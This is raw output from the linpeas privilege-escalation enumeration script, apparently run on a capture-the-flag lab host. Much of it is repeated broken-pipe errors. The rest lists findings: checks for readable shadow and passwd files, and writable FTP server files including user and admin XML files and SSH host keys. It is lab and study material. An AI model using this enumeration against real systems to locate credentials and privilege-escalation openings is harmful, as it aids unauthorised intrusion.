sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error


Files with capabilities (limited to 50):
/usr/bin/ping [1;31mcap_net_raw[0m=ep

[1;34m╔══════════╣ [1;32mChecking misconfigurations of ld.so [1;90m(T1574.006)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
[0m[1;32m[3m/etc/ld.so.conf
[0mContent of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

[1;32m[3m/etc/ld.so.conf.d
[0m[1;32m[3m  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
[0m[3m  - [1;32m/usr/lib/x86_64-linux-gnu/libfakeroot[0m[0m
[1;32m[3m  /etc/ld.so.conf.d/libc.conf
[0m[3m  - [1;32m/usr/local/lib[0m[0m
[1;32m[3m  /etc/ld.so.conf.d/vmware-tools-libraries.conf
[0m[3m  - /usr/lib/vmware-tools[1;32m/lib32[0m/libvmGuestLib.so[0m
[3m  - /usr/lib/vmware-tools/lib64/libvmGuestLib.so[0m
[3m  - /usr/lib/vmware-tools[1;32m/lib32[0m/libvmGuestLibJava.so[0m
[3m  - /usr/lib/vmware-tools/lib64/libvmGuestLibJava.so[0m
[3m  - /usr/lib/vmware-tools[1;32m/lib32[0m/libDeployPkg.so[0m
[3m  - /usr/lib/vmware-tools/lib64/libDeployPkg.so[0m
[1;32m[3m  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
[0m[3m  - [1;32m/lib/x86_64-linux-gnu[0m[0m
[3m  - [1;32m/usr/lib/x86_64-linux-gnu[0m[0m

[3m[1;32m/etc/ld.so.preload
[0m[1;34m╔══════════╣ [1;32mFiles (scripts) in /etc/profile.d/ [1;90m(T1546.004)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files
[0mtotal 12
drwxr-xr-x  2 root root 4096 Feb  9 08:19 .
drwxr-xr-x 75 root root 4096 Jun 14 02:44 ..
-rw-r--r--  1 root root  726 Apr  3  2022 [1;32mbash_completion.sh[0m

[1;34m╔══════════╣ [1;32mPermissions in init, init.d, systemd, and rc.d [1;90m(T1543.002)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd
[0m
[1;34m╔══════════╣ [1;32mAppArmor binary profiles [1;90m(T1518.001)
[0m-rw-r--r-- 1 root root 3461 Mar 30  2023 sbin.dhclient
-rw-r--r-- 1 root root 3448 Mar 12  2023 usr.bin.man

[1;34m═╣ [1;32mHashes inside passwd file? ........... [0m[1;90mNo
[0m[1;34m═╣ [1;32mWritable passwd file? ................ [0m[1;90mNo
[0m[1;34m═╣ [1;32mCredentials in fstab/mtab? ........... [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read shadow files? ............. [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read shadow plists? ............ [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I write shadow plists? ........... [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read opasswd file? ............. [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I write in network-scripts? ...... [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read root folder? .............. [0m[1;90mNo
[0m
[1;34m╔══════════╣ [1;32mSearching root files in home dirs (limit 30) [1;90m(T1083)
[0m/home/
/root/
/var/www
/var/www/wingdata.htb/index.html
/var/www/wingdata.htb/vendor
/var/www/wingdata.htb/vendor/bootstrap
/var/www/wingdata.htb/vendor/bootstrap/js
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js.map
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js
/var/www/wingdata.htb/vendor/bootstrap/js/bootstrap.min.js
/var/www/wingdata.htb/vendor/bootstrap/css
/var/www/wingdata.htb/vendor/bootstrap/css/bootstrap.min.css
/var/www/wingdata.htb/vendor/bootstrap/css/bootstrap.min.css.map
/var/www/wingdata.htb/vendor/jquery
/var/www/wingdata.htb/vendor/jquery/jquery.slim.min.map
/var/www/wingdata.htb/vendor/jquery/jquery.js
/var/www/wingdata.htb/vendor/jquery/jquery.slim.min.js
/var/www/wingdata.htb/vendor/jquery/jquery.min.map
/var/www/wingdata.htb/vendor/jquery/jquery.slim.js
/var/www/wingdata.htb/vendor/jquery/jquery.min.js
/var/www/wingdata.htb/assets
/var/www/wingdata.htb/assets/js
/var/www/wingdata.htb/assets/js/imagesloaded.js
/var/www/wingdata.htb/assets/js/isotope.js
/var/www/wingdata.htb/assets/js/templatemo-custom.js
/var/www/wingdata.htb/assets/js/owl-carousel.js
/var/www/wingdata.htb/assets/js/animation.js
/var/www/wingdata.htb/assets/js/tabs.js
/var/www/wingdata.htb/assets/fonts
/var/www/wingdata.htb/assets/fonts/slick.svg

[1;34m╔══════════╣ [1;32mSearching folders owned by me containing others files on it (limit 100) [1;90m(T1083)
[0m
[1;34m╔══════════╣ [1;32mReadable files belonging to root and readable by me but not world readable [1;90m(T1083)
[0m
[1;34m╔══════════╣ [1;32mInteresting writable files owned by me or writable by everyone (not in Home) (max 200) [1;90m(T1574.009,T1574.010)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
[0mawk: write failure (Broken pipe)
awk: close failed on file /dev/stdout (Broken pipe)
uniq: write error: Broken pipe
[1;31m/etc/[0mvmware-tools/locations.lck
/opt/wftpserver
/opt/wftpserver/Data
/opt/wftpserver/Data/1
/opt/wftpserver/Data/1/groups
/opt/wftpserver/Data/1/portlistener.xml
/opt/wftpserver/Data/1/settings.xml
/opt/wftpserver/Data/1/users
/opt/wftpserver/Data/1/users/anonymous.xml
/opt/wftpserver/Data/1/users/john.xml
/opt/wftpserver/Data/1/users/maria.xml
/opt/wftpserver/Data/1/users/steve.xml
/opt/wftpserver/Data/1/users/wacky.xml
/opt/wftpserver/Data/_ADMINISTRATOR
/opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
/opt/wftpserver/Data/_ADMINISTRATOR/settings.xml
/opt/wftpserver/Data/bookmark_db
/opt/wftpserver/Data/settings.xml
/opt/wftpserver/Data/ssh_host_ecdsa_key
/opt/wftpserver/Data/ssh_host_key
/opt/wftpserver/License.txt
/opt/wftpserver/Log
/opt/wftpserver/Log/Admin
/opt/wftpserver/Log/Admin/Admin-2025-11-2.log
/opt/wftpserver/Log/Admin/Admin-2025-11-3.log
/opt/wftpserver/Log/Admin/Admin-2026-1-12.log
/opt/wftpserver/Log/Admin/Admin-2026-1-14.log
/opt/wftpserver/Log/Admin/Admin-2026-1-20.log
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/Log/audit_db
/opt/wftpserver/Log/Domains
/opt/wftpserver/Log/Domains/1
/opt/wftpserver/Log/Domains/1/2026-2-9.log.zip
/opt/wftpserver/Log/Domains/1/2026-5-11.log.zip
/opt/wftpserver/Log/Domains/1/2026-6-14.log
/opt/wftpserver/Log/ssh_debug_log
/opt/wftpserver/Log/System
/opt/wftpserver/Log/System/System-2026-2-9.log
/opt/wftpserver/Log/System/System-2026-5-11.log
/opt/wftpserver/Log/System/System-2026-6-14.log
/opt/wftpserver/lua
/opt/wftpserver/lua/cgiadmin.lua
/opt/wftpserver/lua/cgi.lua
/opt/wftpserver/lua/json.lua
/opt/wftpserver/lua/ServerInterface.lua
/opt/wftpserver/lua/SessionModuleAdmin.lua
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/pid-wftpserver.pid
/opt/wftpserver/README
/opt/wftpserver/session
/opt/wftpserver/session_admin
/opt/wftpserver/session/b7a9bd4d2cbc683c99405af9b08765c0f528764d624db129b32c21fbca0cb8d6.lua
/opt/wftpserver/version.txt
/opt/wftpserver/webadmin
/opt/wftpserver/webadmin/admin_addadmin_form.html
/opt/wftpserver/webadmin/admin_addadmin.html
/opt/wftpserver/webadmin/admin_add_adminipmask.html
/opt/wftpserver/webadmin/admin_addcert_form.html
/opt/wftpserver/webadmin/admin_add_cert.html
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webadmin/css/allfonts.min.css
/opt/wftpserver/webadmin/css/bulma.min.css
/opt/wftpserver/webadmin/css/ie6.css
/opt/wftpserver/webadmin/css/style.css
/opt/wftpserver/webadmin/edit_area
/opt/wftpserver/webadmin/edit_area/autocompletion.js
/opt/wftpserver/webadmin/edit_area/edit_area.css
/opt/wftpserver/webadmin/edit_area/edit_area_full.js
/opt/wftpserver/webadmin/edit_area/edit_area_functions.js
/opt/wftpserver/webadmin/edit_area/edit_area.js
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webadmin/edit_area/langs/big5.js
/opt/wftpserver/webadmin/edit_area/langs/ch.js
/opt/wftpserver/webadmin/edit_area/langs/cs.js
/opt/wftpserver/webadmin/edit_area/langs/de.js
/opt/wftpserver/webadmin/edit_area/langs/dk.js
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webadmin/edit_area/manage_area.js
/opt/wftpserver/webadmin/edit_area/regexp.js
/opt/wftpserver/webadmin/edit_area/reg_syntax
/opt/wftpserver/webadmin/edit_area/reg_syntax/c.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/cpp.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/css.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/go.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/html.js
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webadmin/edit_area/reg_syntax.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/js.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/lua.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/pas.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/perl.js
/opt/wftpserver/webadmin/edit_area/reg_syntax/php.js
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webadmin/edit_area/resize_area.js
/opt/wftpserver/webadmin/edit_area/search_replace.js
/opt/wftpserver/webadmin/favicon.ico
/opt/wftpserver/webadmin/help
/opt/wftpserver/webadmin/help/english
/opt/wftpserver/webadmin/help/english/admin_content_dyn.html
/opt/wftpserver/webadmin/help/english/admin_content_static.html
/opt/wftpserver/webadmin/help/english/admin_ftsearch.html
/opt/wftpserver/webadmin/help/english/administration.htm
/opt/wftpserver/webadmin/help/english/administrator_console.htm
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webadmin/help_javascript.htm
/opt/wftpserver/webadmin/icons
/opt/wftpserver/webadmin/images
/opt/wftpserver/webadmin/images/logo.ico
/opt/wftpserver/webadmin/images/treeview
/opt/wftpserver/webadmin/include
/opt/wftpserver/webadmin/include/arale-qrcode.js
/opt/wftpserver/webadmin/include/common.js
/opt/wftpserver/webadmin/include/dygraph.js
/opt/wftpserver/webadmin/include/excanvas.js
/opt/wftpserver/webadmin/include/json.js
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webadmin/keeplive.html
/opt/wftpserver/webadmin/language
/opt/wftpserver/webadmin/language/czech.html
/opt/wftpserver/webadmin/language/dutch.html
/opt/wftpserver/webadmin/language/english.html
/opt/wftpserver/webadmin/language/french.html
/opt/wftpserver/webadmin/language/german.html
/opt/wftpserver/webadmin/language.html
/opt/wftpserver/webadmin/language/italian.html
/opt/wftpserver/webadmin/language/japanese.html
/opt/wftpserver/webadmin/language/korean.html
/opt/wftpserver/webadmin/language/polish.html
/opt/wftpserver/webadmin/language/portuguese.html
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/opt/wftpserver/webadmin/main.html
/opt/wftpserver/webadmin/run.lua
/opt/wftpserver/webadmin/webfonts
/opt/wftpserver/webadmin/webfonts/fa-brands-400.eot
